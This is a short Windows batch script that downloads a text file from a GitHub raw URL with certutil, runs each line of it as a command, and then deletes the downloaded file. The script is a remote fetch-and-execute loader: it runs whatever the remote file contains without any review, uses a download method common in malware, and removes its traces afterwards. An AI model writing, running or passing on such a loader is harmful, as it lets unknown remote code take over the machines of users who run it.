@echo off
SET "url=https://raw.githubusercontent.com/Zombro01/blob.../refs/heads/main/nrblx.txt"
SET "tempFile=%TEMP%\nrblx.txt"

echo Downloading command file from %url%...
:: Download the file using certutil
certutil -urlcache -split -f "%url%" "%tempFile%" >nul 2>&1

:: Check if the file was downloaded successfully
IF EXIST "%tempFile%" (
    echo Download successful. Executing commands...
    :: Execute each line in the downloaded file
    for /f "delims=" %%i in (%tempFile%) do call %%i
    :: Clean up the temporary file
    del "%tempFile%" >nul
) ELSE (
    echo Failed to download the command file. Please check your internet connection.
)

pause
